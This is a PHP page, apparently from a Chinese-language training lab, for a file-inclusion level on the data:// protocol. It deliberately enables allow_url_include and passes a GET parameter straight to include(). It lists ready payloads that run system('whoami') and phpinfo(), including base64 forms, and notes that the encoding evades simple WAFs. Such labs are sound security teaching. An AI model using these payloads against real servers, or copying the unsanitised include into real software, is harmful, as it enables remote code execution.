<?php
/**
 * Level 5: data:// 伪协议
 * 难度: ★★☆☆☆
 * 描述: 使用data://协议直接传递数据执行
 * 目标: 通过data://协议执行PHP代码
 */

// 开启allow_url_include
ini_set('allow_url_include', '1');

$message = '';
$content = '';

if (isset($_GET['file'])) {
    $file = $_GET['file'];

    ob_start();
    include($file);
    $content = ob_get_clean();
    $message = '<div class="success">✅ 文件包含成功</div>';
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Level 5 - data://协议</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 30px;
        }
        .header h1 { font-size: 28px; margin-bottom: 5px; }
        .header .difficulty { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #f5576c;
        }
        .info-box h3 { color: #333; margin-bottom: 10px; }
        .info-box ul, .info-box ol { margin-left: 20px; line-height: 1.8; color: #666; }
        .form-box {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            margin: 10px 0;
        }
        input[type="submit"] {
            background: #f5576c;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover { background: #e04555; }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #28a745;
        }
        .hint {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border-left: 4px solid #ffc107;
        }
        .code-box {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box {
            background: #f8f9fa;
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 5px;
            max-height: 400px;
            overflow: auto;
        }
        .result-box pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #f5576c;
            text-decoration: none;
        }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        table th, table td { padding: 8px; text-align: left; border: 1px solid #ddd; font-size: 13px; }
        table th { background: #f8f9fa; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Level 5 - data:// 伪协议</h1>
            <div class="difficulty">难度: ★★☆☆☆ | 技巧: 数据流执行</div>
        </div>

        <div class="content">
            <div class="info-box">
                <h3>📋 关卡说明</h3>
                <ul>
                    <li>data:// 协议可以直接在URL中传递数据</li>
                    <li>可以使用明文或base64编码方式</li>
                    <li>需要条件: allow_url_include=On (本关卡已开启)</li>
                    <li>比php://input更简单,直接在URL中执行代码</li>
                </ul>
            </div>

            <div class="info-box">
                <h3>💡 data:// 语法格式</h3>
                <table>
                    <tr>
                        <th>格式</th>
                        <th>示例</th>
                        <th>说明</th>
                    </tr>
                    <tr>
                        <td>明文</td>
                        <td>data://text/plain,&lt;?php phpinfo(); ?&gt;</td>
                        <td>直接传递代码</td>
                    </tr>
                    <tr>
                        <td>base64</td>
                        <td>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</td>
                        <td>base64编码后传递</td>
                    </tr>
                </table>
            </div>

            <?php echo $message; ?>

            <div class="form-box">
                <h3>文件包含测试</h3>
                <form method="GET">
                    <label>要包含的文件路径:</label>
                    <input type="text" name="file" placeholder="data://text/plain,<?php phpinfo(); ?>" value="<?php echo isset($_GET['file']) ? htmlspecialchars($_GET['file']) : ''; ?>" />
                    <input type="submit" value="包含文件" />
                </form>
            </div>

            <?php if ($content !== ''): ?>
            <div class="result-box">
                <h3>执行结果:</h3>
                <pre><?php echo htmlspecialchars($content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></pre>
            </div>
            <?php endif; ?>

            <div class="hint">
                <strong>🔍 攻击示例 - 明文方式:</strong>
                <div class="code-box">?file=data://text/plain,&lt;?php phpinfo(); ?&gt;

?file=data://text/plain,&lt;?php system('whoami'); ?&gt;</div>

                <p><strong>攻击示例 - base64方式:</strong></p>
                <div class="code-box"># 首先编码PHP代码
echo '&lt;?php phpinfo(); ?&gt;' | base64
# 输出: PD9waHAgcGhwaW5mbygpOyA/Pgo=

# 然后使用编码后的数据
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=</div>

                <p><strong>常用PHP代码及其base64编码:</strong></p>
                <table>
                    <tr>
                        <th>PHP代码</th>
                        <th>base64编码</th>
                    </tr>
                    <tr>
                        <td>&lt;?php phpinfo(); ?&gt;</td>
                        <td>PD9waHAgcGhwaW5mbygpOyA/Pg==</td>
                    </tr>
                    <tr>
                        <td>&lt;?php system('whoami'); ?&gt;</td>
                        <td>PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=</td>
                    </tr>
                </table>

                <p style="margin-top: 15px;"><strong>为什么使用base64？</strong></p>
                <ul>
                    <li>避免URL中特殊字符的问题(如空格、&符号等)</li>
                    <li>绕过某些简单的WAF检测</li>
                    <li>隐藏明显的恶意代码</li>
                </ul>

                <p style="margin-top: 15px;"><strong>在线base64编码工具:</strong></p>
                <div class="code-box"># Linux/Mac
echo 'PHP代码' | base64

# Windows PowerShell
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('PHP代码'))</div>
            </div>

            <a href="index.php" class="back-link">← 返回首页</a>
        </div>
    </div>
</body>
</html>
